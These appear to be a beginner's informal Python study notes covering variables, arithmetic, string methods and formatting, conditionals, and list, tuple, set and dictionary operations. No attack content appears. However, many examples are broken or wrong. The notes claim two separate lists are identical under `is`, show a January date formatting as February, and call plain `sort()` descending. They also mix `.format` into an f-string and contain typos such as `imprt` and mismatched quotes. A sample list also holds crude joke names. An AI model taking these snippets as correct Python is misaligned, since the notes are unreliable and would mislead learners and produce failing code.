1. Variables    2. Numbers    3. Strings     4. Logic        
5. Data Structures(Collections)     6. Loops       7. Functions
8.Object oriented programs   9. Numpy     10. Pandas         11.Matplotlib


--------------------------------------------
TO CHECK WHETHER PYTHON HAS BEEN INSTALLED
--------------------------------------------
In CMD, type python --version

IDE= Integrated Developer Editor

IDLE = Python's own IDE

-------------------------------------------
TOP SECRET OF TOP PROGRAMMERS
-------------------------------------------

Asking great questions

[Help] Answer not being on screen when running Python script

1)Observed Behaviour
Script runs successfully but answer doesnt show up

2)Expected Behaviour
I expected the answer 2 to show up when i ran the script

3)Link to Code[create a secret post on gist.github.com
https://gist.github.com/Zadinator/6e

4)Where I think the problem is
Must be something different between script and shell
Worked in the shell

5)What I have tried
i tried running the script with different numbers. No difference

6)Errors and warnings
None

7)Version Info
Python 3.5.2

8)Screenshots
N/A

------------------------------------------
WHAT IS A VARIABLE
------------------------------------------
Stores values. variable has a name and a value

number = 1

pint(number)
# output value stored in variable name

# variables are case-sensitive  number != Numbers

# Dynamically typed language if the type of a variable is checked during run-time. 
Common examples includes JavaScript, Objective-C, PHP, Python, Ruby, Lisp, and Tcl

# Also means the type of variable can change unlike c, java that you have to state the type of variable

# using type function to find the type of variable
type(number)
>>int

# USE LOWERCASE VARIABLE NAMES, WITH UNDERSCORES(_)FOR SPACES

-----------------------------------------
NUMBERS (INTEGERS AND FLOAT)
-----------------------------------------
Basic Algebra 


#Integer is a whole number, float is a decimal number
# Float datatype for storing decimal numbers
# Order of computations using BODMAS(brackets order division multiplication addition subtraction)

num_1 = '100'                       # data type = string 
num_2 = '200'
num_3 = '200.5'                       # data type = float
num_4 = 200.5

num_1 = int(num_1)                  # cast num_1 into an integer
num_2 = int(num_2)                  # cast num_2 into an integer
num_3 = int(num_3)                  # returns error ValueError: invalid literal for int() with base 10: '200.5'
num_4 =int(num_4)                   # returns 200 ; cast the float to integer
print(num_1 + num_2)

# Arithmetic Operators:
# Addition:       3 + 2           ; 5 
# Subtraction:    3 - 2           ; 1
# Multiplication: 3 * 2           ; 6
# Division:       5 / 2           ; 2.5 ;divide two numbers and return their quotient as a float.
# Floor Division: 5 // 2          ; 2   ;gets the integer quotient, while discarding the remainder. This means that the result of a//b is always an integer.
# Exponent:       3 ** 2          ; 9
# Modulus:        5 % 2           ; 1   

num = 2
num *= 10                          # num = num * 10
print(num) > 20

# Comparisons:                      # returns bool (True or False)
# Equal:            3 == 2          ; False
# Not Equal:        3 != 2
# Greater Than:     3 > 2
# Less Than:        3 < 2
# Greater or Equal: 3 >= 2
# Less or Equal:    3 <= 2          ;False


Python modules Import random , import math (Python documnetation under IDLE docs  https://docs.python.org/3/)
#Creating a health portion

import random

#players current health
health = 50

#create a variable called difficulty and set it to easy mode(1=easy,2=medium,3=hard)
difficulty = 1

#create a variable called potion health
potion_health = int(random.randint(25, 50)/difficulty)

#store in health variable the vlaue of health and potion health
health = health + potion_health

#print function to output new health value onto screen
print(health)



----------------------------------------------------------
STRINGS
----------------------------------------------------------
++ 3 ways to create strings
name = " Donald"                          # 1. using double quotes

message = "John" says hi"                 # broken strings

TO FIX/HANDLE broken strings
msg = ''' "John" says hi" '''

msg = """ "John" says hi" and             # 2. using 3 quotes for multi-line
he will pay the family a visit """             

msg = " \"John\" says hi "                # using escape character '\'

msg = ' "John" says hi '

print('Hello World')                      # 3. using single quotes

print("c:\drive\name")

print(r"c:\drive\name")                   # treats it as raw string
> c:\drive\name

#ask user for name
name = input('enter your name: ')
print(name)

--------------------------------------------------------
CONCATENATE stings
-------------------------------------------------------
# SHOULD BE OF THE SAME DATA TYPE

A = "part one"
B = "part two"

A + B
> part onepart two                            # no space, adds the values of the variable together

A + ', ' + b                                  # adds the 3 strings together
> part one, part two

A * 3
> part onepart onepart one

"=" *20
> ====================

B=1
A+B , returns error                           # because of different types, it returns an error

A + str(B)                                    # The in-built str() function is used to convert the specified value into a string. 
'part one1'


---------------------------------------------
STRING FORMATTING and F -STRINGS
---------------------------------------------
A = 'part'                                      # data type is string

B = 1                                           # data type is an integer

print("{} - {}".format(A,B))                    # using {} as placeholder for the individual variables        
> part - 1

print("{0} - {1}".format(A.upper(),B))
> PART - 1

print("{1} - {0}".format(A,B))          
> 1 - part


#this concatenating  is not readable; need to be mindful of spaces 
person = {'name': 'Jenn', 'age': 23}
> My name is Jenn and I am 23 years old.

sentence = 'My name is ' + person['name'] + ' and I am ' + str(person['age']) + ' years old.'
print(sentence)
> My name is Jenn and I am 23 years old.

sentence = 'My name is {} and I am {} years old.'.format(person['name'], person['age'])      # using string formatting with a dictionary 
print(sentence)
> My name is Jenn and I am 23 years old.

sentence = 'My name is {0} and I am {1} years old.'.format(person['name'], person['age'])
print(sentence)
> My name is Jenn and I am 23 years old.

sentence = 'My name is {0[name]} and I am {0[age]} years old.'.format(person)                 #         
print(sentence)
> My name is Jenn and I am 23 years old.

l = ['Jenn', 23]
sentence = 'My name is {0[0]} and I am {0[1]} years old.'.format(l)                          # using string formatting with list         
print(sentence)

#using string formatting with a class obj
class Person():

    def __init__(self, name, age):
        self.name = name
        self.age = age

p1 = Person('Jack', '33')

sentence = 'My name is {0.name} and I am {0.age} years old.'.format(p1)
print(sentence)
> My name is Jack and I am 33 years old.

tag = 'h1'
text = 'This is a headline'

sentence = '<{0}>{1}</{0}>'.format(tag, text)
print(sentence)
> <h1>This is a headline</h1>

# using string formatting with keyword  arguments
sentence = 'My name is {name} and I am {age} years old.'.format(name='Jenn', age='30')
print(sentence)

sentence = 'My name is {name} and I am {age} years old.'.format(**person)
print(sentence)

# to zero pad and tab values
for i in range(1, 11):
    sentence = 'The value is {:02}'.format(i)               # {:05} to have 5-digit value(5 for width), and have one tab            
    print(sentence) 

import math
print("Floating point {0:10.3f}".format(math.pi))
> Floating point 3.142
we specify 3 digits of precision, 10 for width and f for floating point number.

pi = 3.14159265

sentence = 'Pi is equal to {:.2f}'.format(pi)               # 2 digit of precision
print(sentence)
> Pi is equal to 3.14

sentence = '1 MB is equal to {:,} bytes'.format(1000**2)     #{:} shows we want to do some formatting 
print(sentence)
> 1 MB is equal to 1,000,000 bytes

import datetime

my_date = datetime.datetime(2016, 9, 24, 12, 30, 45)
print(my_date)
> 2016-09-24 12:30:45

sentence = '{:%B %d, %Y}'.format(my_date)                     # %B month as locale's full name; %d day of the month; %Y year without century as a zero-padded decimal number
print(sentence)
> September 24, 2016

sentence = '{:%B %d, %Y} fell on a {:%A} and was the {:%j} day of the year'.format(my_date)
print(sentence)
> September 24, 2016 fell on a Saturday and was the 268 day of the year

from datetime import datetime
time_now = datetime.now()
sentence = '{0:%B %d, %Y} fell on a {0:%A} and was the {0:%j} day of the year'.format(time_now)
print(sentence)
> February 28, 2021 fell on a Sunday and was the 059 day of the year


----------------------
F-STRING
---------------------
A = 'part'                                                                  # data type is string
B = 1

print(f"{A.upper()} - {B}")                                                 # using f -string to print output
> > PART - 1

first_name = 'Corey'
last_name = 'Schafer'

sentence = f'My name is {} {}'.format(first_name,last_name)
print(sentence)
> My name is Corey Schafer

sentence = f'My name is {first_name} {last_name}'
print(sentence)
> My name is Corey Schafer

person = {'name':'Jenn', 'age':23}

sentence = f"Myname is {person['name']} and I am {person['age']} years old"   # if you use single quote, it will raise error becuase it terminate with the key in the placeholder
print(sentence)

# we can run methods and function in our placeholder
for n in range(1, 11):
    sentence = f'The value is {n:02}'
    print(sentence)

from math import pi
sentence = f'Pi is equal to {pi:.4f}'
print(sentence)

>Pi is equal to 3.1416

from datetime imprt datetime

birthday = datetime(1990, 1, 1)

sentence = f'Jenn has a birthday on {birthday: %B %d %Y}'                         #https://docs.python.org/3/library/datetime.html#strftime-and-strptime-format-codes
> Jenn has a birthday on February 01 1990



--------------------------------------------
DIR method & other useful functions(help, round,divmod, isinstance, pow, input, min, max, sorted, eval)
-------------------------------------------
dir([object])                                 # the object is an optional argument; When nothing is passed, the method returns back the list of all the local attributes(local scope)

print(dir())                                     # returns all methods and attributes/properties of the specified object in an alphabetically sorted manner.
> ['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']

print(dir(string))
> ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']

print(dir(list))
['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']

class shape:                                    #class with custom object with undefined __dir__()
    name = "rectangle"
    sides = 4
 
obj = shape()
print(dir(obj))                                 # dir for our custom object
> ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name', 'sides']

# Python dunder (https://www.tutorialsteacher.com/python/magic-methods-in-python) or magic methods = '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', ...
# Magic/Dunder  methods are the special methods that start and end with the double underscores. 
# Magic methods are not meant to be invoked directly by you, but the invocation happens internally from the class on a certain action. 
# For example, when you add two numbers using the + operator, internally, the __add__() method will be called.
>>> num=10
>>> num + 5
15
>>> num.__add__(5)
15

2. With defined __dir__(), the dir() method calls the corresponding __dir__() method which must again return a list of attributes.

class shape:                                    # class with custom object with defined __dir__()
    name = "rectangle"
    sides = 4
    def __dir__(self):
        return ['Square','Circle']
 
obj = shape()
print(dir(obj))                                 #dir for our custom object
> ['Circle','Square']

# Help() functions                              used to display the documentation of modules, functions, classes, keywords etc
print(help(str))
print(help(str.lower()))
> Help on method_descriptor:

lower(self, /)
    Return a copy of the string converted to lowercase.

round() # rounds floating point number to the nearest integer or specified number of places
round(5.6231)
> 6

round(4.55842, 3)
> 4.558

divmod(x, y) #outputs quotient and remainder in a tuple
divmod(27,5)
> (5,2)

isinstance() return True, if the first arg is an instance of that class
isinstance(1,int)
> True

isinstance(1.0,int)
> False

isinstance(1.0, (int, float))
> True 

pow(x,y)                # returns an output x to the power y 
pow(2,3)
> 8

pow(2,3,3)              # returns the remainder of (2 to the power 3) divided by 3 )
> 2 

input() a = input("Enter name: ") # no matter the input, it returns string type

help(input)             #returns details of function

min()                   # returns the lowest element in a list

max()                   # returns the highest element in a list

sorted(L)               # returns a sorted array , from lowest to highest 

eval("3+4")             #evaluates string and returns an object 
> 7

---------------------------------------------
STRING METHODS
---------------------------------------------
syntax = string.method([argument])

"hello".count("e")

text = "happy birthday"
text.count("a")                         # takes a string as an argument and returns the number of occurence                
> 2

text.count("day")
> 1  

x = "Happy Birthday"
x.lower()
> happy birthday

x.upper()
> HAPPY BIRTHDAY
 
print(x)                        # returns intial value because string are immutable(cannot be changed) , but can be overwritten

x.title()
> Happy Birthday

x.capitalize()                  # returns the capital of the first letter
> Happy birthday

x.isalpha(), x.isupper() , x.istitle(), x.isdigit(), x.isalnum        # because of space, .isalpha() will return false

x = "happy birthday"            # assigned string to a variable

x.index("birthday")             # returns the number of the first occurence(index) of the letter or word  #case-sensitive
> 6

x.index("jashdfasdsfs")         # returns an error

x.find("birthday")
> 6

x.find("adsfsfdsfgdgfsfsdfs")   # returns -1 if it cant be found, so preferred to index. it doesnt return error when the str is not found
-1

y = "000000happy0birthday000000"     y = " Hello   World  "
y.strip("0")
'happybirthday'                                 # strip off the arg "0" from both sides

y.lstrip("0")                                   # strip off the arg "0" from left side
'happy0birthday0000000"

y.rstrip("0")                                   # strip off the arg "0" from right side
'00000000happy0birthday'

y.strip()                                       # strips the string off whitespaces
> Hello   World

new_y = y.replace("0","")                       # replaces the first argument(substring) with the second substring(argument)
print(new_y)
> happybirthday    

print(y)                                        # if a new variable is not set, it will return the same value  
> 000000happy0birthday000000

y = y.replace("0","")                           # setting it to the same varibale to modify its value
print(y)

name = input("Whatis your name?: ").strip()
What is your name?: Zee  #with spaces

print(name)      #returns output without space

len(name)        #returns the count of elements in the variable

"at" in "bathlehom"
> True 

"abc" < " daa"
> True

---------------------------------------
SLICING (string)
---------------------------------------
string = "ABCDEFG123456"

#it is ITERABLE meaning you can go through it step by step,  STEP IS CALLED ELEMENT OF THE STRING
#each element has an index and starts from zero

word = "supercalifragilisticexpialidocious"

word[0]
's'

word
'supercalifragilisticexpialidocious'

variable[start:end:step]   # up to end, but included

word[0:5:1]                # get a range of elements , from the first index up to the 5th elemrnt but not including in steps of 1
'super'

word[0:5:2]                 # get a range of elements , from the first index up to the 5th elemrnt but not including in steps of 2
'spr'

word[5:9] = 'cali'

word[5:]
'califragilisticexpialidocious'

word[5::2]                      #slice from the 5th index up to the end, and in 2 steps


word[:7]                        # slice from the beginning up the 7th element but not included
'superca'  

word[::-1]                      # reverse the entire string

sample_url = 'http://coreyms.com'
print(sample_url)

# Reverse the url
print(sample_url[::-1])

# Get the top level domain (TLD)
print(sample_url[-4:])

# Print the url without the http://
print(sample_url[7:])

# Print the url without the http:// or the top level domain
print(sample_url[7:-4])

-------------------------------------------
AUTOMATE SLICES
-------------------------------------------
word[-1]
s 

word[-5]
c 

word[word.index("cali"):word.index("frag")]
cali

word[word.find("cal"):word.find("frag")]
cali
-------------------------
#get user email address
email = input("Enter your email address: ").strip()

#slice out username
#drdecker100@gmail.com
user= email[:email.index("@")]

#slice out domain name
domain = email[email.index("@") + 1:]

#format message
output = "Your usename is {} and your domain name is {}".format(user,domain)

#display output message
print(output) 
--------------------------

------------------------------------------------------
LOGIC AND CONDITIONAL FLOW
------------------------------------------------------
Booleans Comparison Operators

B = True
C = False

E = "True"
type(E)
class 'str'

type(B)
class 'bool'

2 == 3      #equal to
False

2 < 3      #less than
True

2 != 3     #not equal to
True

4 >= 3	   #greater than or equal to
True 

print(bool("abc"))
> True

print(bool(0))
> False

# Comparisons:
# Equal:            ==
# Not Equal:        !=
# Greater Than:     >
# Less Than:        <
# Greater or Equal: >=
# Less or Equal:    <=
# Object Identity:  is                       # 

#  == operator compares the value or equality of two objects, whereas the Python "is" operator checks whether two variables point to the same object in memory(same id).


# and                   # must be object A and object B
# or                    # either object A or object B 
# not                   # switch boolean

# False Values:
    # False
    # None
    # Zero of any numeric type
    # Any empty sequence. For example, '', (), [].
    # Any empty mapping. For example, {}.

---------------------------------------
IF STATEMENTS (CONTROL FLOW)
---------------------------------------
- allows us to execute code if the condition is True.

if condition:
	code                        #execute code if condition is True
	
if True:
    print("It worked, Conditional was True")
> It worked, Conditional was True
    
if False:
    print("It didnt work, Conditional was False")         # will not print because conditional evaluated to False

language = 'Python'                                       # = means assignment

if language == 'Python':                                  # == (equal) comparing two objects
    print('Conditional was true')

> Conditional was true

if language:                                  # == (equal) comparing two objects
    print('Conditional was true')

> Conditional was true

language = 'Java'
if language == 'Python':
    print('Conditional was True')
elif language == 'Java':
    print('Language is Java')
else:
    print("No match")

> Conditional was Java

user = 'Admin'
logged_in = True

if user == 'Admin' and logged_in:
    print('Admin Page')
else:
    print('Bad Creds')

if 5 < 2: print("Five is greater than two!")                               # short hand syntax
else: print("I will keep doing my best")

ticket = [5]
tag_id = None

if tag_id is None: tag_id = ticket                                        # short hand syntax
else: tag_id += ticket

print(tag_id)

print("Yes") if 5 > 2 else print("No")                                    # short hand syntax   if 5>2 , print(yes) or else print No

> Admin Page                          # if IF condition is met

a = [1, 2, 3]
b = [1, 2, 3]
c = a 

print(a == b)
> True 

print(a is b)
> True

print(id(a))
> 2639312 

print(id(b))
> 2640472 

print(id(c))                            # c and a points to the same id
> 2639312

print(id(a) == id(b))                   # similar to is
> True

condition = False                       # False, None, 0 , " " , () , {} evaluates to false

if condition:
    print('Evaluated to True')
else:
    print('Evaluated to False')


num1 = 100
num2 = 150

if num1 > num2:
    print("num1 is bigger than num2")
else:
    print("num2 is bigger than num1")
----------------------
num1 = 100
num2 = 100

if num1 > num2:
    print("num1 is bigger than num2")

elif num2 > num1:
	print("num2 is bigger than num1")

else:
    print("both are equal")
-------------------------------
if condition1:
	code
elif condition2:
	code2
elif condition3:
	code3
else:
	code4
	
-----------------------------------------
LOGICAL OPERATORS
-----------------------------------------
comparison operators   > < = == compare expressions and elements

logical operators combine and modify conditions

not True
> False

not 2 < 3
> False

not 4 == 3
> True

if not y < x:
	print("It worked")

----------------------------------------------------------	
NOT gate had one input (output is inverse of input)
----------------------------------------------------------
"AND" Truth tabel has two inputs, returns True if both inputs are True

1 and 1 
1

1 and 0
0

True and True
True

True and False
False

C = 10
D = 5

#wont print because condition is False
if C > 10 and D > 1:
	print("It worked")

#will print because conditio is True	
if not (C > 10 and D > 1):
	print("It worked")	

---------------------------------------------------------------------------------------------------------
OR Truth Table has two inputs, returns True when one of the inputs is True or when both inputs are True

True or True
True

True or False
True

False or False
False

C = 5
D = -1

if C > 1 or D > 1:
	print("it worked")
	
 C = 6
 D = 2
 
 if (C > 5 and D > 5) or (C > 1 and D > 1):
	print("it worked")


--------------------------------------------------------------------------------------------
DATA STRUCTURES(collections) - List, Tuple, Set, Dictionary
---------------------------------------------------------------------------------------------
# Lists and Tuples allow us to work with sequential data, and Sets allow us to work with unordered unique values.

# There are four collection data types in the Python programming language:

# List is a collection which is ordered and changeable. Allows duplicate members.
# Tuple is a collection which is ordered and unchangeable. Allows duplicate members.
# Set is a collection which is unordered and unindexed. No duplicate members.
# Dictionary is a collection which is unordered and changeable. No duplicate members




LISTS DATA STRUCTURE (list are ordered (positioning/indexing), mutable(changeable), and have duplicate elements
----------------------------------------------------------------------------------------------
# create a list of courses
courses = ['History', 'Math', 'Physics', 'CompSci']
print(courses)

# to get first item
print(courses[0])
> History

# to get the last item
print(courses[-1])
> CompSci

# returns IndexError if index is out of range
print(courses[5])

type(courses)
class 'list'

paakow = ["A","B","C",1,2,3 "Do","Rey","Mi",True,False]
paakow[4]
> 2

paakow[-2]
> True

S = [12,"banana"", 5.3,12]              # duplicates because integer 12 appears twice

------------------------------------------------
SLICING        
------------------------------------------------
# list[start:end:step]                   # end is not inclusive

my_list = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
#          0, 1, 2, 3, 4, 5, 6, 7, 8, 9
#        -10,-9,-8,-7,-6,-5,-4,-3,-2,-1

print(my_list[::-1])                    # prints out first element to the last element in reverse steps (entire list is reversed)
> [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]

print(my_list[0:3])                     # prints out the first element up to the third but not included
> [0,1,2]

print(my_list[-7:-2])                   # prints out the negative 7th index up to the negative 2nd index 
> [3, 4, 5, 6, 7]

print(my_list[-2:-7:-1])                # prints out the negative 2nd index up to the negative 7th index in a reverse step
> [8, 7, 6, 5, 4]

print(my_list[-2:3:-1]) 
> [8, 7, 6, 5, 4]

# Nested list
our_list = [1,2,[3,4,5],6,7,8]

our_list[2]
> [3,4,5]

our_list[2][1]
> 4

our =_list[2][0::2]
> [3,5]

>>> jack = [5,6,7,8,"Ama"]
jack[-1]
> Ama

>>> type(jack[-1])
<class 'str'>

len(jack)
5

L = [1,5,2,6,2,9]
>> 2 in L 
>> True

>> 10 in L 
>> False

-----------------------------------------------------------
# create list of users
known_users = ["Alice","Bob","Kofi","Kwesi","Meggy","Ass","Boobs","Dee"]

print(len(known_users))


while True:
    print("Hi! My name is Travis")
    name = input("Enter your name: ").strip().captilize()

    if name in known_users: 
        print("Hello {}!!".format(name))

    else:
        print("name NOT recognised\n")

------------------------------------------- 
List Methods
-------------------------------------------
courses = ['History', 'Math', 'Physics', 'CompSci']

courses.append('Arts')                                          # argument is added to the end of list
print(courses)
> ['History', 'Math', 'Physics', 'CompSci', 'Arts']

courses.insert(0, 'Chemistry')                                  #2nd argument, chemistry, is added to the first index of the list
print(courses)
>  ['Chemistry', 'History', 'Math', 'Physics', 'CompSci']

courses.extend(['Education,'Agric'])                            # used when we want to add multiple values to the end of the list 
print(courses)
> ['History', 'Math', 'Physics', 'CompSci','Education,'Agric']

courses.remove('Math')                                           # removes the first occurence of the element, the item should be unique otherwise, you may need a loop
print(courses)
> ['History', 'Physics', 'CompSci']

courses.pop()                                                    # will remove the last item of the list
print(courses)
> ['History', 'Math', 'Physics']

popped = courses.pop()                                            # can store the remove value into a variable
print(popped)
> CompSci

#courses.pop(index)                                               # worked with the index of the element
courses.pop(3)

courses.reverse()                                                 # reverse the list
> ['CompSci', 'Physics', 'Math', 'History']

courses.sort()                                                    # arranges the elements in the list in alphabetically order
> ['CompSci', 'History', 'Math', 'Physics']

nums= [5,3,2,4,1]
nums.sort()                                                       # arranges the numbers in ascending order, alters the original list
> [1,2,3,4,5]

courses.sort(reverse=True)                                        # arranges the elements in the list in the reverse  order
> ['Physics', 'Math', 'History', 'CompSci']

nums.sort()                                                       # arranges the numbers in decending order, alters the original list
> [5,4,3,2,1]

sorted(courses)                                                   # sorts list but does not alter the original list

sorted_courses = sorted(courses)                                  # storing the sorted list to another variable

print(course.index('ComspSci'))                                   # to find index of the element in the list
> 3

print('Math' in courses)                                          # returns a bool(True) if expression is true
> True

#accessing values of list by looping
for course in courses:
    print(course)

# accessing index and values by looping with enumerate
for index,course in enumerate(courses, start=1):
    print(index, course)

# CHANGING FROM LIST TO STRING
course_str = ' - '.join(courses)
print(course_str)
> History - Math - Physics - CompSci

# CHANGING FROM LIST TO STRING
new_list = course_str.split(' - ')
print(new_list)
> ['History, Math, Physics, CompSci']

del courses[0]                                                    # remove object in the first index

-------------------------------------------
Adding items to lists
-------------------------------------------
A = [3,1,45,6,79]

A = A + 1 #returns error, cant concatenate int to list

A = A + [1]
[3,1,45,6,79,1]

A = A + ["BCD"]
[3,1,45,6,79,1,'BCD']

A = A + list("BCD")
A
[3,1,45,6,79,1,'BCD','B','C','D']

A = A + list(123)  # returns error because integers are not iterable. strings are iterable

A = A + [1,2,3]
A 

A = A + list(str(123))
A

A = A + [5,6,7,8]
[3,1,45,6,79,1,'BCD','B','C','D',5,6,7,8]

A = A + [[5,6,7,8]]
[3,1,45,6,79,1,'BCD','B','C','D',[5,6,7,8]]

A.append([10,11,12,13])
A 
[3,1,45,6,79,1,'BCD','B','C','D',[5,6,7,8],[10,11,12,13]]

#the append method returns an empty value
A = [5,12,4,5]
A = A.append(10)            #should not be re-assign instead A.append(10)
A 
     #empty value
type(A)
<class 'NoneType'>

A = []
type(A.append(10))
<class 'NoneType'>

A.insert(index, element)
A.insert(2,100)
[5,12,100,4,5]	 

A.insert(2,[10,20,30])
[5,12,[10,20,30],100,4,5]

#list are mutable (You do not NEED TO RE-ASSIGN WITH LIST METHODS, WILL RETURN NONETYPE )

A = [1,2,3]
A[0] =5
A = [5,2,3]


---------------------------------------------------------------------------
TUPLES (ordered ; unchangeable(immutable); can have duplicate elements)
---------------------------------------------------------------------------
#once A tuple is created, you cannot change its contents 
#it is immutable

our_tuple = 1,2,3,"A","B","C"

type(our_tuple)
<class 'tuple'>

our_tuple = (1,2,3,"A","B","C")
type(our_tuple)
<class 'tuple'>

our_tuple[0:3]
(1,2,3)

S = (12,"banana"", 5.3,12)

#tuple object does not support item assignment
our_tuple[2] = 100   #returns error

#string are iterable but does not support assigment

A = [1,2,3]

tuple(A)
(1,2,3)

A = tuple(A)
(1,2,3)

(A,B,C) = 1,2,3
A 
1
B 
2
C 
3

D,E,F = [1,2,3]
D 
1
E 
2
F 
3

G,H,I = "789"
G
7
H
8
I 
9

del A   #can delete all items, but can not delete one element(immutable)

T2 = T  #to copy elements

# Mutable (easy to loop through and access)
list_1 = ['History', 'Math', 'Physics', 'CompSci']
list_2 = list_1

print(list_1)
print(list_2)
> ['History', 'Math', 'Physics', 'CompSci']
> ['History', 'Math', 'Physics', 'CompSci']

list_1[0] = 'Art'                                 # changing the value of list_1 changes the values of list_2 because they are mutable

print(list_1)
print(list_2)
> ['Art', 'Math', 'Physics', 'CompSci']
> ['Art', 'Math', 'Physics', 'CompSci']

# Immutable (not changed)
tuple_1 = ('History', 'Math', 'Physics', 'CompSci')
tuple_2 = tuple_1

print(tuple_1)
print(tuple_2)

tuple_1[0] = 'Art'                                 # returns TypeError: 'tuple' object does not support item assignment. cannot change or modify

print(tuple_1)
print(tuple_2)


---------------------------------------------------------
SETS (Unordered (the order changes); addable/removable ; no duplicates/unique elements)
---------------------------------------------------------
S = {12,"banana"", 5.3, 12}
print(S)
{12,"banana"", 5.3}             #all elements are unique

X in S                          # returns bool if expression is true or false

S.add("new item")

S.update({"more","items"})      # more than one element

S.remove("banana")              # the remove() method will raise an error if the specified item does not exist

S.discard("bana")               # the discard() method will not raise an error if the specified item does not exist

del S 

S2 = S.copy()

cs_courses = {'History', 'Math', 'Physics', 'CompSci'}
art_courses = {'History', 'Math', 'Art', 'Design'}

print(cs_courses.intersection(art_courses))
> {'History', 'Math'}

print(cs_courses.difference(art_courses))
> {'Physics', 'CompSci'}

print(cs_courses.union(art_courses))
> {'Art', 'CompSci', 'Physics', 'Design', 'History', 'Math'}

# Empty Lists
empty_list = []
empty_list = list()

# Empty Tuples
empty_tuple = ()
empty_tuple = tuple()

# Empty Sets
empty_set = {} # This isn't right! It's a dict
empty_set = set()

thisset = set(("apple", "banana", "cherry"))                # note the double round-brackets
print(thisset)

thisset = set(["apple", "banana", "cherry", "cherry"])      # removed duplicates
print(thisset)

print(list(thisset))                                        # converts it to a list but loses the index

---------------------------------------------------------
DICTIONARIES (Unordered ; changeable ; no duplicates)   (word and definition)
---------------------------------------------------------
student = {}
print(student)
> {}

type(student)
<class 'dict'>

student = {'name':"John', 'age':25, 'courses': ['Math', 'Compsci']}

print(student['courses'])
> ['Math', 'Compsci']

#the key are mostly string, but they can be any immutable type, string, integer . 
# the value could be a string, list, integer

student = {1:"John', 'age':25, 'courses': ['Math', 'Compsci']}
print(student[1])                                                 # key is an integer in this case
> John 

print(student['phone'])                                           # returns a key error when key is not found
> Traceback (most recent call last):
  File "Untitled-1.py", line 3, in <module>
    print(student['phone'])
KeyError: 'phone

print(student.get('phone'))                                        # returns None is key is absent
> None

print(student.get('phone', 'Not found'))                           # returns argument 2 if key is not found
> Not found 

student['phone'] = '555-5555'                                      #  updates the key with new value
student['name'] = 'Jane'

print(student)
> {'name': 'Jane', 'age': 25, 'courses': ['Math', 'Compsci'], 'phone': '555-5555'}

student.update({'name': 'jane', 'age':26, 'phone': '555-5555'})    # updates the dict with new values
print(student)
> {'name': 'Paul', 'age': 26, 'courses': ['Math', 'Compsci'], 'phone': '555-5555'}

del student['age']
print(student)
>

age = student.pop('age')
>print(age)
26

print(student.clear())                                               # empties the values of the dictionary
> {}

print(len(student))                                                    # count of number of keys
> 3

print(student.keys())
> dict_keys(['name', 'age', 'courses'])

print(type(student.keys()))
> <class 'dict_keys'>

print(student.values())
> dict_values(['John', 25, ['Math', 'Compsci']])

print(type(student.values()))
> <class 'dict_values'>

print(student.items())
> dict_items([('name', 'John'), ('age', 25), ('courses', ['Math', 'Compsci'])])

for key in student:
    print(key, end=", ")
> name, age, courses,

for value in student.values():
    print(value, end=", ")
> John, 25, ['Math', 'Compsci'],

for key,value in student.items():
    print(key, value,sep=':', end=", ")
> name:John, age:25, courses:['Math', 'Compsci'],

students = {"Dan":20, "Bob":30}
print(students)
> {'Dan': 20, 'Bob': 30}

error_std = {Alice:20, Bob:30}
Traceback (most recent call last):
  File "<pyshell#6>", line 1, in <module>
    error_std = {Alice:20, Bob:30}
NameError: name 'Alice' is not defined

#it is iterable , but not indexable
students.key()[0]
Traceback (most recent call last):
  File "<pyshell#21>", line 1, in <module>
    students.key()[0]
AttributeError: 'dict' object has no attribute 'key'
>>> 
#wont work, unless we turn it into a list

students_keys = list(students.keys())
students_keys
['Dan', 'Bob']
students_keys[1]
>'Bob'
 
students.values()
> dict_values([20, 30])

b = list(students.values())
b
> [20, 30]
b[1]
> 30
 
# Unlike a tuple and list, dictionaries are orderless
students
> {'Dan': 20, 'Bob': 30}

# to concatenate two dictionaries 
D = {"name": ["Ama","Afia"], "age" : ["20","30"]}
D2 = {"blood" :["O","AB"]}

D.update(D2)
print(D)
{'name': ['Ama', 'Afia'], 'age': ['20', '30'], 'blood': ['O', 'AB']}


#Problems

def getDataFromUser():
    D = {}
    while True:
            
        studentId = input("Enter student ID: ")
        marksList = input("Enter the marks by comma separated values: ")
        moreStudent = input('Enter "no" to quit insertions or enter to continue: ')

        if studentId in D:
            print(studentId, "is already inserted")

        else:
            D[studentId] = marksList.split(",")
        
        if moreStudent.lower() == "no":
            return D 
        
        quitters = input("Enter q,x,exit to quit program: ")
        if quitters.lower() in ["q","x","exit"]:
